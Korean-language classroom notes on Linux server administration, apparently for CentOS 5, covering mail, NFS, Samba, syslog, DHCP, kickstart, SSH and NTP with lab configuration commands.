		* /var/log/xferlog : ftp접속해서 파일을 업로드하거나 다운로드할때 쌓임
	
학원 스텝 6
	MAIL 서버 관리 
		*용어
			MUA(Mail User Agent)		-	outlook, evolution, thunderbird
			MTA(Mail Transfer Agent)	-	MS Exchange, sendmail, qmail, postfix	
		
			ESMTP(Extended Simple Mail Transfer Protocol)  
			POP3(Post Office Protocol 3)				  
			IMAP4(Internet Message Access Protocol 4)	  
		
		MAIL Server(sendmail)
			Software      : sendmail, sendmail -cf
			Daemon        : sendmail
			Port 	      : 25
			Protoclo 	  : TCP
			Conf File     : /etc/mail/sendmail.cf
			Sub Conf File : /etc/mail*, /etc/aliases
			Startup Script: /etc/init.d/sendmail

		POP3/IMAP4 Server(dovecot)
			Software      : dovecot
			Daemon        : dovecot
			Port 	      : 110/143
			Protoclo 	  : TCP
			Conf File     : /etc/dovecot.conf
			Startup Script: /etc/init.d/dovecot
		
		실습
			[실습] SMPT/ESMPT 명령어 사용법
				# mail –v mail214@example.com
				# telnet localhost 25
				
			[실습] POP3 명령어 사용법
				# mutt –f pop://mail214@mail.example.com
				# telnet localhost 110 
			
			[실습] 메일 서버 구축
			
			[실습] 메일 보내기 실습
				* L -> L, L -> R, R -> L
				
			[실습] 메일 포워딩 실습
				A에게 보내면 B에게 간다 A는 없어도 됨 유저가
				
			[실습] 메일 메일링 리스트 연습
				# vi /etc/aliases 										편집하는곳
				teammain:team01,team02,user01@linux2XX.example.com		추가 메일을 teammain한테 보내면 유저123456한테 간다 
				teamsub::include:/etc/mail/list/teamsub.list			추가함 teamsub.list들을 에게 보낸다 한번에 
				# newaliases 											설정 ㅈ거용 
				# cat /etc/passwd | awk -F: '$3 > 499 && $3 < 60000 {print $1}' > /etc/mail/list/teamsub.list  이걸로 회사내부모든사람을 폴더에 넣고 메일보내면 됨 
				
			[실습] mail 클라이언트 프로그램 사용법
				* (GUI) evlution
				* (TUI) mutt
				* (CLI) mail.mailx
				
			[실습] 웹메일(Web Mail)
				# yum -y install squirrelmail
				# chown apache.apache -R /usr/share/squirrelmail 
				# chown apache.apache /etc/squirrelmail/config.php 
				# chown apache.apache -R /var/lib/squirrelmail 
				# chown apache.apache -R /var/spool/squirrelmail 
				# /usr/share/squirrelmail/config/conf.pl
				# vi /etc/httpd/conf/httpd.conf
				Alias /webmail/ /usr/share/squirrelmail
			[참고] 스팸 차단 소프트웨어(Spamassasin)
			[참고] 안티 바이러스 소프트웨어(Calm AV)

학원 스텝 7
	NFS 서버 관리 	
		* 용어 
			분산 파일시스템(Distributed File System)
				* NFS
				* SMB/CIFS
		NFS 서버		
			Software      : nfs-utils, nfs-utils-lib, system-config-nfs
			Daemon & Port & protocol: 
				NFSv2	  : UDP(mount(32768), nfsd(2049))
				NFSv3	  : UDP/TCP(mount(32768), nfsd(2049))
				NFSv4	  : TCP(nfsd(2049))
			Conf File     : /etc/exports
			Startup Script: /etc/init.d/nfs
		
		NFS 서버 파일
			* /etc/exports : 부팅시 공유하는 정보를 담는 파일 서버에서사용
			* /etc/fstab   : 부팅시 마운트할 파일을 담음	 클라에서사용 
		
		NFS 관련 명령어
			* exports CMD	: 공유자원을 확인 할 때 사용하는 명령어
				# exportfs -v
			* showmount CMD : 공유할 자원 확인 할 때 사용하는 명령어
				# showmount -e 172.16.6.214
			* mount CMD	  	: 공유된 자원 마운트 할 때 사용하는 명령어
				# mount -o intr,timeo=15 172.16.6.214:/share /p
		
		실습	
			[실습] NFS 서버 구축(EX: 공유디렉토리 172.17.6.0(공유옵션))
			[실습] system-config-nfs
			[실습] NFS 클라이언트에서 root 사용자가 마운트 하는 경우
				공유옵션
				마운트옵션
				파일/디렉토리퍼미션
				* root_squash/no_root_squash
				
			[실습] MAN Page 서버 구축
			[실습] Home Directory 서버 구축
			[실습] 원격 CD 마운트 
			[실습] 원격 백업 서버 구축
			[실습] DNS 웹 부하분산(DNS+WEB+NFS)
	
학원 스텝 8
	SAMBA 서버 관리 
		* 용어
			* NFS			-> nfs
			* CIFS / SMB	-> samba
			* CIFS = SMB + NetBios
			
		SAMBA Server
			* Software      : samba, samba-client, samba-common, system-config-samba
			* Daemon & Port & protocol: 
				nmbd	    : 137/udp, 138udp
				smbd	    : 139/tcp, 445/tcp
			* Conf File     : /etc/samba/smb.conf
			* Sub File      : /etc/samba/(lmhost,smbusers)
			* Startup Script: /etc/init.d/smb
		
		SAMBA 관련 파일
			* /etc/samba/(lmhost, smbusers)
			* /etc/samba/smb.conf
		
		SAMBA 관련 명령어
			* (Clinet)smbclient CMD		: 클라이언트에서 서버쪽 공유된 목록 물어보는것 
				# smbclient -L 172.16.6.252 -N 				서버의252에게 N옵션으로 아이디패스워드안치고 보는법 이거 안되면 아래것
				# smbclient -L 172.16.6.252 -U soldesk  	서버의252에게 U옵션으로 아이디패스워드치고 보는것
				# smbclient //172.16.6.252/share -U soldesk share파일을 공유한다 252번의 
			* (Server)smbstatus CMD		: 클라이언트가 공유폴더에 접근시 상태정보를 봄
				# smbstatus
			* (Server)testparm CMD		: 서버쪽에서 문법점검
				# testparm -s
				# testparm -s -v 		: 자세하게 보여줌
			* (Client)mount.cifs / umount.cifs
				# mount.cifs 172.16.6.252:share /mnt/server -o user=soldesk
				# mount.cifs //172.16.6.252/share /mnt/server -o user=soldesk
		
		실습
			[실습] 윈도우 클라이언트 -- 접근 --> 리눅스 공유디렉토리에 접근
				(리눅스 SMB서버)
					# mkdir -m 777 -p /share 	공유폴더 만들기
					# vi /etc/smb.conf 			주설정파일 열어서 내용 설정 
						workgroup = WORKGROUP
						server string = Samba server linux214
						host allow = 127. 172.16.6. 192.168.10. 192.168.0.
						security = share
						[public]
						comment = Samba Test for linux214
						path = /samba
						public = yes
						writable = yes
					# service smb restart
					# chkconfig smb on
				(윈도우 클라이언트)
					(ㄱ) \\172.16.6.214\share	일시적인 값으로 저장
					(ㄴ) 네트워크 드라이브 연결 		영구적인 값으로 저장
					
			[실습] 리눅스 클라이언트 -- 접근 --> 윈도우 공유디렉토리에 접근 
				(윈도우 SMB서버)
					공유디렉토리 생성(c:\samba_share)
					공유디렉토리 -> 속성 -> 공유 탭 
				(리눅스 클라이언트)
					(ㄱ) # mount.cifs //192.168.0.66/samba_share /mnt/server -o soldesk
					(ㄴ) 리눅스 바탕화면 -> Home Directory Icon 클릭 -> 파일탭 -> 서버에 연결
						service Type : Windows share 
						server 	     : 192.168.0.66 윈도우IP
						Share 		 : samba_share
						User Name 	 : soldesk
					(ㄷ) /etc/fstab 파일을 사용하는 경우	
						# vi /etc/fstab
						//192.168.0.66/samba_share /mnt/server cifs credentials=/etc/samba/passwd.txt 0 0
						# vi /etc/samba/passwd.txt
						username=soldesk
						password=soldesklove
						
			[실습] 리눅스 클라이언트 -- 접근 --> 리눅스 공유디렉토리에 접근 
				(리눅스 SMB서버)
					# vi /etc/samba/smb.conf (기존의 설정에 추가한다)
						security = user
					[test1]
						comment =linux test for linux214
						path = /test1
						writable = yes
						valid users = test1 admin
					# service smb restart
					# useradd -s /sbin/nologin test1
					# smbpasswd -a test1 
				(리눅스 클라이언트)
					# smbclient //172.16.6.214/test1 -U test1
			
			[참고] NFS 와 SMB/CIFS 차이점
			
			[실습] SWAT (Samba Web Admin Tool)
				(WEB) SWAT
				(GUI) system-config-samba
			[실습] system-config-samba

학원 스텝 9
	로그 서버 관리
		리눅스 기본 로그 파일들 
			* /var/log/messages	시스템의 전반적인 메세지를 기록하는 로그파일
			* /var/log/secure	개인인증을 기록하는 로그파일
			* /var/log/dmesg	부팅할때 메세지를 기록하는 로그 파일
			* /var/log/maillog	sendmail 메일 관련 작업을 기록하는 로그 파일
			* /var/log/xferlog	FTP 서버에서 업로드/다운로드을 기록하는 로그 파일
			* /var/log/wtmp		사용자의 로그인/로그아웃 시간을 기록하는 로그파일
		
		syslogd 체계
			* Software  	 : sysklogd
			* Daemon    	 : syslogd
			* Port	    	 : 514
			* Protocol 		 : udp
			* Conf File		 : /etc/syslog.conf
			* Startup Script : /etc/init.d/syslog
				
			* /etc/syslog.conf	 : 	주설정파일
			* 로그종류.레벨		로그기록위치 
				로그종류		: kern, mail, mark, daemon, user, .....
				로그레벨		: emerg, alert, crit, error, warning, .....
				로그기록위치	: Logfile, Console, User01, @hostA
		
		기본 로그 파일 체계 실습
			[실습] 로그 파일 모니터링
				# gnome-system-log &
				# tail -f /var/log/massages	
			[실습] 인증 관련 기록(authpriv.*  /var/log/secure)
			[실습] 메일 관련 기록(mail.*		 /var/log/maillog)
			[실습] 크론 관련 기록(cron.*		 /var/log/cron)
			
		새로운 로그 파일 생성 
			[실습] 새로운 로그 파일 생성(local0.notice /var/log/file.log)
			[실습] 백업 스크립트 로그 생성
		
		원격 로그 서버 구축
			[실습] 로그서버 구축1
				(Log Server)
					# vi /etc/syslog.conf
						local0.notice /var/log/file.log
					# vi /etc/sysconfig/syslog
						SYSLOGD_OPTIONS="-r -m 0"			r때문에 원격에 접속 가능 
					# touch /var/log/file.log
					# chmod /var/log/file.log
					# service syslog restart
				(Log Client)
					# vi /etc/syslog.conf
						local0.notice @LogServer
					# service syslog restart
					
			[실습] 로그서버 구축2
				(Log Server)
					# vi /etc/syslog.conf
						local0.warn /var/log/warn.log
				(Log Client)
					# vi /etc/syslog.conf
						local0.notice /var/log/file.log
						local0.warn	  @LogServer
			
			[실습] 로그 분석 방법 
				시간 기준으로 검색
				로그레벨 기준으로 검색
				키워드 기준으로 검색
				
				[참고] 로그 분석 방법
				* CentOS 5 : grep CMD
							 logwatch CMD
							 auditd(auditctl, aurepoty, ausearch)
							 
			[실습] 로그 파일 관리 
				* OS/Service -> logrotate CMD, /etc/logrotate.conf
					EX) /var/log/messages, /var/log/httpd/access_log
				* Service 	 -> 각서비스 로그 관리 체계, 수동으로 관리 
				find /Log -name "*.log" -type f -mtime +30 -exec rm -f {} \;
	
학원 스텝 10
	DHCP 서버 관리
		용어
			DHCP Discover
			DHCP offer
			DHCP Request
			DHCP Ack
	
		DHCP서버
			Software : dhcp or dhcpv6
			Daemon : dhcpd
			Port : 67
			Protocol : udp
			Conf File : /etc/dhcpd.conf ( /usr/share/doc/dhcp*/dhcp.conf .sample)
			Sub Conf File : /var/lib/dhcpd/*
			Startup Script : /etc/init.d/dhcpd
			
		DHCP 참고 사항
			* 일반적으로는 DHCP 서버와 DHCP 클라이언트는 같은 대역에 존재해야 한다.
			* 일반적으로 같은 대역에 DHCP 서버는 한대만 있어야 한다.
			* Boot Relay 서버를 설정하여 외부의 DHCP 서버를 통해 여러 네트워크를 관리할 수 있다.
			* DHCP 서버가 관리하는 range 대역에 누군가 IP를 사용하면, 그 IP는 unused 된다.
			
		실습
			[실습] DHCP 서버 구축 (eth0(x), eth1(o))
				# cp -p /usr/share/doc/dhcp*/dhcpd.conf /etc/dhcpd.conf
				# vi /etc/dhcpd.conf
				# vi /etc/sysconfig/dhcpd
				DHCPARGS=eth1
				# service dhcpd restart
				# chkconfig dhcpd on
				
				[TERM1] # tail -f /var/log/messages
				[TERM2] # cat /var/lib/dhcp/dhcpd.leases
		
			[실습] DHCP 클라이언트 구축(eth0(o), eth1(x))
				VMware > VM > Settings > Network Adapter(eth) > (Bridge -> NAT)
				# system-config-network-tui
				-> eth0(dhcp)
				# ifdown eth1
				# ifdown eth0
				# ifup eth0
				# cat /var/lib/dhclinet/dhclient-eth#.leases
			
			[실습] DHCP 서버 구축(고정 IP 설정)
				# vi /etc/dhcpd.conf
					host linux114.example.com {
						hardware ethernet MAC주소;
						fixed-address 192.168.10.114;
						}
				# service dhcpd restart
			
			[실습] DHCP 클라이언트 실습(고정 IP 설정)
				# ifdown eth0
				# ifup eth0

학원 스텝 12
	kickstart 서버 관리
		-------------------------------------------------------
		|CD 설치		| Kickstart 설치(네트워크 설치)			|
		=======================================================
		|CD 부팅		| 네트워크 부팅 -> DHCP, TFTP			|
		|OS 설정		| ks.cfg -> WEB(system-config-kickstart)|
		|OS 설치		| CD 스풀 -> NFS						|
		-------------------------------------------------------

	<작업 순서>
	(1) CD 스풀(spool,  /export/centos/*)
		- WEB (EX: /var/www/html/centos/*)
		- NFS (EX: /export/centos/*)
		- FTP (EX: /var/ftp/pub/centos/*)
		- CD  (EX: /media/CentOS_5.5_Final/*)
		- Local Directory
			* 작업
				CD 마운트(/media/CentOS_5.x_Final/)
				# mkdir -p /export/centos
				# cp -a /media/CentOS_5.x_Final/* /export/centos 약2분소요
		
	
	(2) TFTP 서버 구축(chkconfig tftp on; service xinetd restart) : 부팅용 이미지 제공
		* 작업
			# yum -y install tftp tftp-server
			# chkconfig tftp on
			# service xinetd restart
	
	(3) ks.cf 파일 생성(system-config-kickstart)
		- system-config-kickstart 를 사용
		- /root/anaconda-ks.cfg 복사/편집
		- 직접 생성하는 방식(EX: ks.cfg) <- 매우 비추
			* 작업
				# yum -y install system-config-kickstart
				# system-config-kickstart &
				# cp ks.cfg /www1
	
	(4) WEB 서버 구축(/www1/ks.cfg, service httpd restart, chkconfig httpd on)
		* 작업
			# vi /etc/httpd/conf/httpd.conf
			-------------------------------------------------------
			NameVirtualHost 192.168.10.212:80
			<VirtualHost 192.168.10.212:80>
				ServerAdmin root@linux212.example.com
				DocumentRoot /www1
				ServerName www.linux212.example.com
				<Directory /www1>
					Options Indexes FollowSymLinks includes
				</Directory>
			</VirtualHost>
			-------------------------------------------------------
			# chkconfig httpd on
			# service httpd restart

	(5) NFS 서버 구축(/etc/exports, service nfs restart, chkconfig nfs on)
		* 작업
			# vi /etc/exports
			-------------------------------------------------------
			/export/centos		*(ro,no_root_squash)
			-------------------------------------------------------
			# service nfs restart
			# chkconfig nfs on
		
	(6) DHCP 서버 구축(/etc/dhcpd.conf, service dhcpd restart, chkconfig dhcpd on)
		* 작업
			# yum -y install dhcpd
			# vi /etc/dhcpd.conf
			-------------------------------------------------------
			allow booting;
			allow bootp;
			.....중략.....
				host linux112.example.com {
					hardware ethernet 00:0c:29:2c:b5:c7; <- 클라이언트의 MAC주소 입력 *(8)작업시 확인 후 수정
					fixed-address 192.168.10.112;
				}
				next-server 192.168.10.212;
				filename "linux-install/pxelinux.0";
			-------------------------------------------------------
			# service dhcpd restart
			# chkconfig dhcpd on
		
	(7) 자동 설치 설정(system-config-netboot)
		* 작업
			# vi /etc/hosts
			192.168.10.112 linux112.example.com <- 설치하고 싶은 클라이언트
			# yum -y install system-config-netboot
			# system-config-netboot &
	
	(8) 클라이언트 설치
		-> 클라이언트 MAC 주소 확인

학원 스텝 12
	SSH 서버 관리
		Software : openssh openssh-server openssh-clients
		Daemon : sshd
		Port : 22
		Protocol : tcp
		Conf File : /etc/ssh/sshd_config(sshd), /etc/ssh/ssh_config(ssh CMD)
		Sub Conf File : /etc/ssh/*
		Startup Script : /etc/init.d/sshd
		etc : sshd(22) -> ssh/scp/sftp CMD
	
	SSH 명령어
		ssh CMD
		scp CMd
		sftp CMD
	
	실습
		[실습] 인증키에 대한 실습
			* public key, private key
		
		[실습] ssh CMD, scp CMD, sftp CMD 실습
		
		[실습] 공개키 인증 방식(Public key authentication)
			# ssh-keygen -t rsa|dsa
				-> <enter>
				-> cnetos123/centos123			
			# ssh-copy-id ~/.ssh/id_rsa.pub root@172.16.6.114
		
		[실습] 암호 입력 없이 로그인 가능하도록 설정
			(임시적)
				# ssh-keygen -t rsa|dsa
				-> <enter>
				-> cnetos123/centos123
				# ssh-copy-id ~/.ssh/id_rsa.pub root@172.16.6.114
				# ssh-agent bash
				# ssh-add 
				# ssh 172.16.6.114 CMD
			(영구적)
				# ssh-keygen -t rsa|dsa
				-> <enter>
				# ssh-copy-id ~/.ssh/id_rsa.pub root@172.16.6.114
		
		[실습] cmd.sh, copy.sh
		[실습] 사용자 접근 제어 
			# vi /etc/ssh/sshd_config 파일에서 정의
				* root 사용자 접근 제어(PermitRootLogin yes|no)
					(EX) PermitRootLogin no
				* 일반 사용자 접근 제어(AllowUsers, DenyUsers)
					(EX) AllowUsers user01 user02
		
		[실습] SSH 서버 포트 변경 
			# vi /etc/ssh/sshd_config 파일에서 port부분 찾아서 변경
				* 22-> 2222 (port 2222)
					(EX) Port 2222
				# ssh -p 2222 localhost
		
		[실습] SSH X11 Forwarding
			(서버)
			# vi /etc/ssh/sshd_config 파일에서 X11부분 찾아서 변경
				* X11Forwarding Yes|no
			(클라)
				# ssh -X <IP>
				# xclock &
				
		[실습] SSH Port Forwarding 
			* Local Port Forwarding
			* Remote Port Forwarding 
	
학원 스텝 13
	NTP 서버 관리
		NTP 서버의 필요성?
			실무에서 많이 사용되는 방식
				(ㄱ) rdate CMD
					# rdate -s time.bora.net
					# crontab -e
						1 0 * * * rdate -s 203.248.240.143 		/* time.bora.net */
				(ㄴ) NTP Server/Clinet
					(장점) 
						(ㄱ) NTP 클라이언트가 NTP 서버로 부터 시간 정보를 가지고 올때
							네트워크에서 흘러간 시간을 고려한다.
							시간 = 12:00 + (a+b)/2
						
						(ㄴ) NTP 클라이언트가 NTP 서버로 부터 시간 정보를 가지고 오면 
							자신의 시간과 큰 차이(30분이상)가 발생이 되면, 가지고 온 시간정보로 설정하지 않는다.
						
						(ㄷ) NTP 클라이언트가 NTP 서버로 부터 시간 정보를 동기화 하는데 많은 시간이 걸린다.
						
						(ㄹ) 호환성이 좋다 
		
		NTP Server
			* Software 	 	 : ntp
			* Daemon 		 : ntpd
			* Port 			 : 123
			* Protocol 	 	 : udp
			* Conf. File 	 : /etc/ntp.conf
			* Sub Conf		 : /etc/ntp/*
			* Startup Script : /etc/init.d/ntpd
		
		실습
			[실습] NTP 서버 구성 GUI 
				# system-config-time (# system-config-date, # dateconfig)
			
			[실습] rdate CMD + crontab CMD
				# rdate -s 172.16.6.252
				# crontab -e
					59 23 * * * rdate -s 172.16.6.252
			
			[실습] NTP 서버/클라이언트 구성
				# yum -y install ntp
				# vi /etc/ntp.conf
					server 172.16.6.252 prefer
				# chkconfig ntpd on
				# service ntpd restart

학원 스텝 14
	MySQL 서버 관리	

tip : 
클론을뜨면 /etc/hosts파일에서 호스트이름과 아이피 바꾸기 
그리고 system-config-network-tui 에서 dns들어가서 호스트이름 바꾸고
edit에서 eth0이랑 eth1이랑 아이피 바꾸기 

=====================================--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------==============리눅스 끝===================================================================================




















	

	
	
	
	
































































































































